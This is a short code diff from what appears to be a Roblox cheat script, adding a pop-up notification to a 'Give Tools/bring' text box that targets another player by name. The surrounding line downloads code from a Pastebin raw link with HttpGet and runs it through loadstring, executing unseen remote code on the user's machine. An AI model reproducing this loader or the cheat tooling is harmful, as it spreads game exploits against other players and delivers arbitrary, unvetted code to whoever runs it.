@@ -197,6 +197,14 @@ end)
 
 LocalPlayer:NewTextBox("Give Tools/bring", "NAME___", function(txt)
 Target = (txt)
+
+wait(1)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Script"; -- the title 
+Text = "Use Real Name?";
+Duration = 4;
+})
+
 loadstring(game:HttpGet('https://pastebin.com/raw/ZFB2fwnj'))()
 end)
 
